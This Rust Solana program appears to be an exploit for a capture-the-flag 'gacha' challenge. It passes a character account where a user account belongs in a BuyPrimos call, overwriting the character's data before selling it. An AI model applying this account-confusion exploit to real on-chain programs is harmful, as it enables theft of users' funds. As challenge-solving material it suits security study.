#![cfg(not(feature = "no-entrypoint"))]

use borsh::{BorshDeserialize, BorshSerialize};
use solana_program::account_info::next_account_info;
use solana_program::program::invoke;

use solana_program::{
    account_info::AccountInfo,
    entrypoint,
    entrypoint::ProgramResult,
    instruction::{AccountMeta, Instruction},
    msg,
    pubkey::Pubkey,
    system_program,
};

use crate::*;

entrypoint!(process_instruction);
fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    instruction_data: &[u8],
) -> ProgramResult {
    let account_iter = &mut accounts.iter();
    let user = next_account_info(account_iter)?;
    let gft = next_account_info(account_iter)?;
    let character_info = next_account_info(account_iter)?;
    let useraccount = next_account_info(account_iter)?;
    let vault = next_account_info(account_iter)?;
    let _sys = next_account_info(account_iter)?;

    let vault_bump = instruction_data[0];

    let account_name = "f1x3r";

    let _ = invoke(
        &create_useraccount(*gft.key, *user.key, account_name),
        &[useraccount.clone(), user.clone(), _sys.clone()],
    );

    let character_id = 0;

    let _ = invoke(
        &buy_primos(*gft.key, *user.key, account_name, 800),
        &[
            useraccount.clone(),
            user.clone(),
            vault.clone(),
            _sys.clone(),
        ],
    );

    let _ = invoke(
        &buy_character(*gft.key, *user.key, account_name, character_id),
        &[
            useraccount.clone(),
            user.clone(),
            character_info.clone(),
            vault.clone(),
            _sys.clone(),
        ],
    );

    let amount = 303;

    let exp = Instruction {
        program_id: *gft.key,
        accounts: vec![
            AccountMeta::new(*character_info.key, false),
            AccountMeta::new(*user.key, true),
            AccountMeta::new(*vault.key, false),
            AccountMeta::new_readonly(system_program::id(), false),
        ],
        data: GachaInstruction::BuyPrimos { amount, vault_bump }
            .try_to_vec()
            .unwrap(),
    };

    let _ = invoke(
        &exp,
        &[
            character_info.clone(),
            user.clone(),
            vault.clone(),
            _sys.clone(),
        ],
    );
    msg!("{:?}", character_info.data.borrow());
    let cc = Character::deserialize(&mut &character_info.data.borrow()[..])?;
    msg!("{:?}", cc);

    let _ = invoke(
        &sell_account(*gft.key, *user.key, account_name, &[character_id]),
        &[
            useraccount.clone(),
            user.clone(),
            vault.clone(),
            character_info.clone(),
            _sys.clone(),
        ],
    );

    Ok(())
}
